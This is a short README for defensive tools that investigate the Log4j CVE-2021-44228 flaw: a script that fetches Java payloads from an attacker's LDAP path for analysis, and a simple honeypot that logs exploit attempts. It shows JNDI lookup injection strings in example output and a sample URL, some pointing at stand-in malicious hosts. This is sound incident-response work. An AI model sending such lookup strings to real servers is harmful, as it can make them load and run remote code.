# Log4jTools
Tools for investigating Log4j CVE-2021-44228

![Screen Shot 2022-06-01 at 10 28 05 PM](https://user-images.githubusercontent.com/38732378/171537849-9404b854-ac26-47fe-8446-362d2e1c36a3.png)


## Bug explanation and Demo
https://www.youtube.com/watch?v=0-abhd-CLwQ

## FetchPayload.py (Get java payload from ldap path provided in JNDI lookup).
Requirements: curl (system), requests (python)

Example command:
```
python FetchPayload.py ldap://maliciouserver:1337/path

[+] getting object from ldap://maliciouserver:1337/path
[+] exploit payload: http://maliciouserver:80/Exploit.class
[+] seeing if attacker left behind un-compile payload http://maliciouserver:80/Exploit.java
[x] failed to find payload Exploit.java
[+] trying to fetch compiled payload http://maliciouserver:80/Exploit.class
[+] found payload and saved to file Exploit.class_
```

## SimpleHoneypot.py (honeypot to catch exploit attempts based on presence of '${' ).
Requirements: python3, asyncore

Example command:
```
python3 SimpleHoneypot.py

[2021-12-09 13:00:00,000] Possible CVE-2021-44228 Attempt: 127.0.0.1:1111 -> port 8080 - GET /?id=${jdni:ldap://127.0.0.1:1389/hax} HTTP/1.1

```

## Sample URL:

http://kgb.fyi:443/?id=${jdni:ldap://133.33.33.331389/HELLO-CLASS}
